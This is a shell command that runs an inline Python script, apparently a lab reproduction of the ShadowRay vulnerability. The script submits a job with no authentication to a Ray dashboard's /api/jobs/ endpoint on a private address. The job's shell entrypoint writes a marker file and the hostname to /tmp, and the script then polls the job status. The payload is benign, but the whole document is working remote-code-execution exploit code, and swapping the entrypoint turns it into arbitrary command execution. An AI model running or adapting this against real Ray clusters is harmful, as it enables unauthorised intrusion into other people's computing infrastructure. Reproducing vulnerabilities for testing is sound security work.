$ python3 -c 'import json
import requests
import sys
import time
payload = json.loads('"'"'{"entrypoint": "echo SHADOWRAY_CVE_OK > /tmp/cve_marker.txt && hostname > /tmp/cve_host.txt"}'"'"')
base = '"'"'http://172.19.0.2:8265'"'"'
response = requests.post(base + '"'"'/api/jobs/'"'"', json=payload, timeout=30)
sys.stdout.write(f'"'"'post_status={response.status_code} body={response.text[:1000]}\n'"'"')
response.raise_for_status()
body = response.json()
submission_id = body.get('"'"'submission_id'"'"') or body.get('"'"'job_id'"'"')
sys.stdout.write(f'"'"'submission_id={submission_id}\n'"'"')
terminal = {'"'"'SUCCEEDED'"'"', '"'"'FAILED'"'"', '"'"'STOPPED'"'"'}
if not submission_id:
    sys.exit(1)
for attempt in range(60):
    status_response = requests.get(base + '"'"'/api/jobs/'"'"' + submission_id, timeout=10)
    sys.stdout.write(f'"'"'poll={attempt} status={status_response.status_code} body={status_response.text[:1000]}\n'"'"')
    if status_response.status_code == 404:
        sys.stdout.write('"'"'poll_unavailable=surrogate_or_legacy_endpoint\n'"'"')
        sys.exit(0)
    status_response.raise_for_status()
    status_body = status_response.json()
    status = status_body.get('"'"'status'"'"')
    if status in terminal:
        sys.exit(0 if status == '"'"'SUCCEEDED'"'"' else 1)
    time.sleep(1)
sys.exit(1)'
